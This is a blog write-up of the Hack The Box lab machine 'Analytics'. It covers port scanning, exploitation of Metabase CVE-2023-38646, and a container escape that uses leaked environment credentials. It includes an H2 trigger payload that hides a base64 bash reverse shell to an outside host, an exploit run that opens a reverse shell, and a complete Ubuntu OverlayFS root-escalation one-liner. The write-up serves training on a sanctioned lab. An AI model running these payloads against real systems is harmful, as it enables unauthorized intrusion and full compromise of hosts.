---
layout: post
title: Analytics (HTB-Easy)
date: 2023-12-14
categories: [Hack The Box]
tags: [linux, Metabase, Docker, RCE]
---

### Box Release Date: October 7, 2023

## Machine Summary

This was an easy level box from HackTheBox that had you utilize a pre-auth RCE vulnerability for the Metabase application to get a shell on the box. You then had to escape the docker container you got the shell in by finding plain-text credentials. Once user access was established, to get root a Ubuntu kernel vulnerability needed to be leveraged.

## Reconnaissance

As always I start the box off with a port scan using Rustscan

```bash
─(h0ax㉿kracken)-[~/htb/boxes/easy/analytics]
└─$ rustscan -a 10.10.11.233 -b 500 -t 1000
[sudo] password for h0ax: 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.233:22
Open 10.10.11.233:80
[~] Starting Script(s)
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-9 20:50 UTC
Initiating Ping Scan at 20:50
Scanning 10.10.11.233 [2 ports]
Completed Ping Scan at 20:50, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:50
Completed Parallel DNS resolution of 1 host. at 20:50, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:50
Scanning 10.10.11.233 [2 ports]
Discovered open port 22/tcp on 10.10.11.233
Discovered open port 80/tcp on 10.10.11.233
Completed Connect Scan at 20:50, 0.09s elapsed (2 total ports)
Nmap scan report for 10.10.11.233
Host is up, received syn-ack (0.062s latency).
Scanned at 2023-11-03 20:50:23 UTC for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
```

I then fired off a more intense port scan using nmap, targetting port 80.

```bash
──(h0ax㉿kracken)-[~/htb/boxes/easy/analytics]
└─$ sudo nmap -p 80 -T5 -Pn -A --script vuln analytical.htb 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-09 16:50 EDT
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.32% done; ETC: 16:51 (0:00:01 remaining)
Stats: 0:04:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.33% done; ETC: 16:54 (0:00:02 remaining)
Nmap scan report for analytical.htb (10.10.11.233)
Host is up (0.055s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.tenable.com/plugins/nessus/55976
|_      https://www.securityfocus.com/bid/49303
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=analytical.htb
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://analytical.htb:80/
|     Form id: comment
|_    Form action: #
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   114.50 ms 10.10.16.1
2   25.02 ms  analytical.htb (10.10.11.233)
```

I also like to __curl__ the sites that have port 80 open to see what the exact domain name is. Our previous __nmap__ scan returned a domain name from the traceroute command that it ran.

```bash
┌──(h0ax㉿kracken)-[~/htb/boxes/easy/analytics]
└─$ curl -i -k http://10.10.11.233:80                                                                                        
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 09 Dec 2023 20:53:01 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://analytical.htb/

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

We have a domain name __analytical.htb__. Let's add this to __/etc/hosts__. Now let's visit the site.

![landing-page](/assets/images/machines/htb/analytics/landing-page-analytics.png)

We can also see that there is a subdomain for this site when we hover our mouse over the __Login__ hyperlink.

![new-subdomain](/assets/images/machines/htb/analytics/new-subdomain.png)

Let's add this subdomain to our hosts file.

Let's go to the login page as well.

![login-page](/assets/images/machines/htb/analytics/login.png)

Here we can see that there is a login page for an application called __Metabase__. We can provide a username and password to login or click the forgot password link. Clicking the forgot password link does nothing and takes you to a page that says for you to contact your administrator.

Going back to the main page of the site, I could not find anything else of interest. From here we are limited in our attack vector, our next best bet is to run a directory fuzzing scan to see if we can find anymore endpoints.

I first scanned __analytical.htb__ and did not find anything so I then scanned __data.analytical.htb__.

```bash
┌──(h0ax㉿kracken)-[~/htb/boxes/easy/analytics]
└─$ feroxbuster -u http://analytical.htb/ -w ~/pentestin/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt                     

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://analytical.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/h0ax/pentestin/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://analytical.htb/images => http://analytical.htb/images/
301      GET        7l       12w      178c http://analytical.htb/js => http://analytical.htb/js/
301      GET        7l       12w      178c http://analytical.htb/css => http://analytical.htb/css/
200      GET        9l       62w     2803c http://analytical.htb/images/fb-icon-2.png
200      GET        5l       47w     1720c http://analytical.htb/images/phone-icon.png
200      GET        8l       70w     3330c http://analytical.htb/images/instagram-icon.png
200      GET       14l       84w     4530c http://analytical.htb/images/icon-4.png
200      GET        7l       61w     2837c http://analytical.htb/images/fb-icon.png
200      GET       10l       70w     3839c http://analytical.htb/images/icon-3.png
200      GET      452l     1395w    11727c http://analytical.htb/css/responsive.css
200      GET        8l       58w     3302c http://analytical.htb/images/instagram-icon-2.png
200      GET      370l     1201w     9645c http://analytical.htb/js/custom.js
200      GET        6l       73w     3248c http://analytical.htb/css/owl.carousel.min.css
200      GET        8l       73w     3030c http://analytical.htb/images/twitter-icon-2.png
200      GET        5l       55w     1485c http://analytical.htb/images/map-icon.png
200      GET        3l       43w     1102c http://analytical.htb/images/icon.png
200      GET        9l       85w     3701c http://analytical.htb/images/icon-2.png
200      GET        7l       58w     2965c http://analytical.htb/images/twitter-icon.png
200      GET        5l       51w     1831c http://analytical.htb/images/mail-icon.png
200      GET        9l       68w     2462c http://analytical.htb/images/call-icon.png
200      GET      213l     1380w    11324c http://analytical.htb/js/jquery-3.0.0.min.js
200      GET        4l       45w     1538c http://analytical.htb/images/email-icon.png
200      GET        6l      352w    19190c http://analytical.htb/js/popper.min.js
200      GET      817l     1328w    13877c http://analytical.htb/css/style.css
200      GET        5l     1287w    87088c http://analytical.htb/js/jquery.min.js
200      GET        1l      870w    42839c http://analytical.htb/css/jquery.mCustomScrollbar.min.css
200      GET        7l      896w    70808c http://analytical.htb/js/bootstrap.bundle.min.js
200      GET        5l      478w    45479c http://analytical.htb/js/jquery.mCustomScrollbar.concat.min.js
200      GET        7l     1604w   140421c http://analytical.htb/css/bootstrap.min.css
200      GET     1225l     7999w   640669c http://analytical.htb/images/img-1.png
200      GET      995l     5511w   461589c http://analytical.htb/images/img-2.png
200      GET     1111l     6288w   520385c http://analytical.htb/images/img-4.png
200      GET     1077l     6289w   516092c http://analytical.htb/images/img-3.png
200      GET    18950l    75725w   918708c http://analytical.htb/js/plugin.js
200      GET      364l     1136w    17169c http://analytical.htb/
[####################] - 20s   120045/120045  0s      found:35      errors:0      
[####################] - 20s    30001/30001   1502/s  http://analytical.htb/ 
[####################] - 20s    30001/30001   1533/s  http://analytical.htb/images/ 
[####################] - 19s    30001/30001   1540/s  http://analytical.htb/js/ 
[####################] - 20s    30001/30001   1537/s  http://analytical.htb/css/
```

For the second scan, I had two endpoints return 404 errors: /api and /app. The __api__ endpoint seemed interesting so I ran another fuzzing scan to see if I could find any more subdirectories.

```bash
──(h0ax㉿kracken)-[~/htb/boxes/easy/analytics]
└─$ feroxbuster -u http://data.analytical.htb/api/ -w ~/pentestin/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt                    

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://data.analytical.htb/api/
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/h0ax/pentestin/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        5w       30c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401      GET        1l        1w       15c http://data.analytical.htb/api/search
401      GET        1l        1w       15c http://data.analytical.htb/api/user
401      GET        1l        1w       15c http://data.analytical.htb/api/database
401      GET        1l        1w       15c http://data.analytical.htb/api/email
401      GET        1l        1w       15c http://data.analytical.htb/api/google
401      GET        1l        1w       15c http://data.analytical.htb/api/action
401      GET        1l        1w       15c http://data.analytical.htb/api/dashboard
200      GET        1l        1w       15c http://data.analytical.htb/api/health
401      GET        1l        1w       15c http://data.analytical.htb/api/activity
401      GET        1l        1w       15c http://data.analytical.htb/api/card
401      GET        1l        1w       15c http://data.analytical.htb/api/collection
401      GET        1l        1w       15c http://data.analytical.htb/api/bookmark
401      GET        1l        1w       15c http://data.analytical.htb/api/table
403      GET        1l        8w      131c http://data.analytical.htb/api/notify
401      GET        1l        1w       15c http://data.analytical.htb/api/alert
401      GET        1l        1w       15c http://data.analytical.htb/api/task
401      GET        1l        1w       15c http://data.analytical.htb/api/timeline
401      GET        1l        1w       15c http://data.analytical.htb/api/pulse
401      GET        1l        1w       15c http://data.analytical.htb/api/ldap
401      GET        1l        1w       15c http://data.analytical.htb/api/setting
401      GET        1l        1w       15c http://data.analytical.htb/api/tiles
401      GET        1l        1w       15c http://data.analytical.htb/api/permissions
401      GET        1l        1w       15c http://data.analytical.htb/api/revision
401      GET        1l        1w       15c http://data.analytical.htb/api/field
401      GET        1l        1w       15c http://data.analytical.htb/api/transform
[####################] - 4m     30001/30001   0s      found:25      errors:0      
[####################] - 4m     30001/30001   113/s   http://data.analytical.htb/api/
```

## Shell as Metabase

We got a hit on the __/api/health__ endpoint. So we have an api that we can interact with. Looks like we are getting several unauthorized responses as well, I am betting that there are more endpoints that we can find here.

Let's see what api endpoints we can find by looking at the Metabase documentation. Let's also see if Metabase has any vulnerabilities that have been reported. First, let's get the version for Metabase.

Going to the __http://data.analytical.htb/auth/login?redirect=%2F__ site and going through the source code you can find the following version info below. I found this by running the command 

```bash
curl -i -k http://data.analytical.htb/auth/login?redirect=%2F | egrep -in -C 2 'version'
```

```
"version-info-last-checked":"2023-11-03T18:15:00.015812Z","application-logo-url":"app/assets/img/logo.svg","application-favicon-url":"app/assets/img/favicon.ico","show-metabot":true,"enable-whitelabeling?":false,"map-tile-server-url":"https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png","startup-time-millis":16529.0,"redirect-all-requests-to-https":false,"version":{"date":"2023-06-29","tag":"v0.46.6","branch":"release-x.46.x","hash":"1bb88f5"}
```

We have a version number: __v0.46.6__

Looking at this [site](https://nsfocusglobal.com/metabase-remote-code-execution-vulnerability-cvs-2023-38646-notification/), we can see that we have the community open-source version installed, and the version that is installed on the target is actually vulnerable to CVE-2023-38646.

Let's look into the vulnerability reports from [Metabase](https://www.metabase.com/blog/security-incident-summary) and from [Assetnote](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/).

Both are great writeups of what the vulnerabilities are that are included in this CVE. I will focus on Metabase's. The following was a vulnerability summary for how an attacker could get RCE:

```
Putting all of these together, one could:

    1. Call /api/session/properties to get the setup token.
    2. Use the setup token to call /api/setup/validate.
    3. Take advantage of the missing checks to get H2 to execute commands on the host operating system.
    4. Open a reverse shell, create admin accounts, etc.
```

Looks like I was correct in my assumption that there were more endpoints that were open. Let's curl this endpoint and see what sort of response we get.
Curling the page actually returns a lot of data so let's visit __data.analytical.htb/api/session/properties__ in a web browser.

This returned a long string of what appears to be JSON. So I will curl the site again and grep for 'token' and see what I find.

```bash
(h0ax㉿kracken)-[~/htb/boxes/easy/analytics]
└─$ curl data.analytical.htb/api/session/properties | jq | egrep -in -C 1 'setup-token'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 74478    0 74478    0     0   212k      0 --:--:-- --:--:-- --:--:--  219k
3545-  "landing-page": "",
3546:  "setup-token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
3547-  "application-colors": {},
```

As we can see, we got a value back for __setup-token__ that we can use.

Following the attack path lain out by the vulnerability disclosure, we can use the token we found to call the __/api/setup/validate__ endpoint.

Looking at the [Assetnote](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/) writeup, we can actually see all of the header information and data that needs to be sent to this endpoint.

```
POST /api/setup/validate HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 812

{
    "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}
```

At this point we now know what needs to be done to get RCE on this box. On Github I found a great exploit that we can utilize to get a shell spawned, https://github.com/threatHNTR/CVE-2023-38646/blob/main/exploit.py.

Running this script got the following (*Remember to start a netcat listener*):

```bash
(h0ax㉿kracken)-[~/htb/boxes/easy/analytics]
└─$ python3 shell.py --url http://data.analytical.htb --ip 10.10.16.25 --port 9999 


_____________   ______________      _______________   ________  ________       ________    ______   ________   _____   ________ 
\_   ___ \   \ /   |_   _____/      \_____  \   _  \  \_____  \ \_____  \      \_____  \  /  __  \ /  _____/  /  |  | /  _____/ 
/    \  \/\   Y   / |    __)_  ______/  ____/  /_\  \  /  ____/   _(__  <  _______(__  <  >      </   __  \  /   |  |/   __  \  
\     \____\     /  |        \/_____/       \  \_/   \/       \  /       \/_____/       \/   --   \  |__\  \/    ^   |  |__\  \ 
 \______  / \___/  /_______  /      \_______ \_____  /\_______ \/______  /     /______  /\______  /\_____  /\____   | \_____  / 
        \/                 \/               \/     \/         \/       \/             \/        \/       \/      |__|       \/  
                                                                                                                                
by threatHNTR

Target Host: http://data.analytical.htb
Setup Token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
Version: v0.46.6
Encoded Payload: c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjUvOTk5OSAwPiYx
Sending POST request to http://data.analytical.htb/api/setup/validate...
Reverse shell request sent successfully.

-----------------------------------------------------------------

(h0ax㉿kracken)-[~/htb/boxes/easy/analytics]
└─$ nc-htb
listening on [any] 9999 ...
connect to [10.10.16.27] from (UNKNOWN) [10.129.43.20] 45314
sh: can't access tty; job control turned off
/ $ id
uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
/ $ which python
/ $ which python3
/ $ which script
/ $ egrep 'script' /usr/bin
/ $
```

We are able to get a reverse shell! I also checked to see if I could do an easy shell upgrade with a couple of the techniques that I usually use.

I did my usual stuff and tried to see if there was a user flag that I could read. I instead was able to find that we are actually in a docker container.

```bash
/ $ ls -alh /home
total 12K    
drwxr-xr-x    1 root     root        4.0K Aug  3 12:16 .
drwxr-xr-x    1 root     root        4.0K Dec 14 17:28 ..
drwxr-sr-x    1 metabase metabase    4.0K Aug 25 15:17 metabase
/ $ ls -alh /home/metabase
total 8K     
drwxr-sr-x    1 metabase metabase    4.0K Aug 25 15:17 .
drwxr-xr-x    1 root     root        4.0K Aug  3 12:16 ..
lrwxrwxrwx    1 metabase metabase       9 Aug  3 12:22 .ash_history -> /dev/null
lrwxrwxrwx    1 metabase metabase       9 Aug 25 15:17 .bash_history -> /dev/null
/ $ ls -alh /
total 92K    
drwxr-xr-x    1 root     root        4.0K Dec 14 17:28 .
drwxr-xr-x    1 root     root        4.0K Dec 14 17:28 ..
-rwxr-xr-x    1 root     root           0 Dec 14 17:28 .dockerenv  (****)
drwxr-xr-x    1 root     root        4.0K Jun 29 20:40 app
drwxr-xr-x    1 root     root        4.0K Jun 29 20:39 bin
drwxr-xr-x    5 root     root         340 Dec 14 17:28 dev
drwxr-xr-x    1 root     root        4.0K Dec 14 17:28 etc
drwxr-xr-x    1 root     root        4.0K Aug  3 12:16 home
drwxr-xr-x    1 root     root        4.0K Jun 14  2023 lib
drwxr-xr-x    5 root     root        4.0K Jun 14  2023 media
drwxr-xr-x    1 metabase metabase    4.0K Aug  3 12:17 metabase.db
drwxr-xr-x    2 root     root        4.0K Jun 14  2023 mnt
drwxr-xr-x    1 root     root        4.0K Jun 15  2023 opt
drwxrwxrwx    1 root     root        4.0K Aug  7 11:10 plugins
dr-xr-xr-x  208 root     root           0 Dec 14 17:28 proc
drwx------    1 root     root        4.0K Aug  3 12:26 root
drwxr-xr-x    2 root     root        4.0K Jun 14  2023 run
drwxr-xr-x    2 root     root        4.0K Jun 14  2023 sbin
drwxr-xr-x    2 root     root        4.0K Jun 14  2023 srv
dr-xr-xr-x   13 root     root           0 Dec 14 17:28 sys
drwxrwxrwt    1 root     root        4.0K Aug  3 12:16 tmp
drwxr-xr-x    1 root     root        4.0K Jun 29 20:39 usr
drwxr-xr-x    1 root     root        4.0K Jun 14  2023 var
/ $ 
```

## Privlege Escalation to Metalytics

I then cd'ed to the /tmp directory and uploaded linpeas to see what I could do to elevate my privleges. I took a look at the metabase.db directory and tried to __egrep__ out the string 'password' from the db files but I couldn't find anything. Im suspecting that the answer is in that folder, there must be a way that we can use those files.

I went back and looked at the linpeas results again and noticed that there were credentials stored in an environment variable.

```
╔══════════╣ Environment
╚ Any private information inside environment variables?
HISTFILESIZE=0
MB_LDAP_BIND_DN=
LANGUAGE=en_US:en
USER=metabase
HOSTNAME=e8cbe5f33228
FC_LANG=en-US
SHLVL=5
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
HOME=/home/metabase
OLDPWD=/plugins
MB_EMAIL_SMTP_PASSWORD=
LC_CTYPE=en_US.UTF-8
JAVA_VERSION=jdk-11.0.19+7
LOGNAME=metabase
_=linpeas.sh
MB_DB_CONNECTION_URI=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_PASS=
MB_JETTY_HOST=0.0.0.0
META_PASS=An4lyt............ <pass here>
LANG=en_US.UTF-8
MB_LDAP_PASSWORD=
HISTSIZE=0
SHELL=/bin/sh
MB_EMAIL_SMTP_USERNAME=
MB_DB_USER=
META_USER=metalytics
LC_ALL=en_US.UTF-8
JAVA_HOME=/opt/java/openjdk
PWD=/tmp
HISTFILE=/dev/null
MB_DB_FILE=//metabase.db/metabase.db
```

We can get a username = __metalytics__ and a password. Those credentials allow us to ssh into the box and get the user flag.

```bash
(h0ax㉿kracken)-[~/htb/boxes/easy/analytics]
└─$ sshpass -p 'An4lyt......#' ssh metalytics@10.129.43.20
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Dec 15 03:37:51 AM UTC 2023

  System load:              0.134765625
  Usage of /:               93.5% of 7.78GB
  Memory usage:             29%
  Swap usage:               0%
  Processes:                204
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.129.43.20
  IPv6 address for eth0:    dead:beef::250:56ff:fe96:882b

  => / is using 93.5% of 7.78GB
  => There are 49 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Dec 15 03:36:25 2023 from 10.10.16.27
metalytics@analytics:~$ cat user.txt 
fff505f17161.................. (ur turn!)
metalytics@analytics:~$
```

## Privlege Escalation to Root

I ran the usual sudo -l command to see what I could run as root but found I did not have sudo privs as metalytics, so I went and uploaded linpeas again. Looking at the linpeas results, one thing of interest that jumped out was that the box was running a vulberable version of Ubuntu.

```bash
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 6.2.0-25-generic (buildd@lcy02-amd64-044) (x86_64-linux-gnu-gcc-11 (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.3 LTS
Release:	22.04
Codename:	jammy

metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

Looking for CVEs online for this version returned two of interest: CVE-2023–2640 and CVE-2023–32629. This link [here](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/) describes the vulnerabilities to achieve priv esc.

The writeup showed a command that you could run to escalate your privleges to root. *This is all a single command*

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

Running the above command actually allows us to get root access, and we can read the root flag!

```bash
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
root@analytics:~# id
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
root@analytics:~# cat /root/root.txt 
2d3d8fe3dd93da0..........
root@analytics:~# 
```

See you in the next one!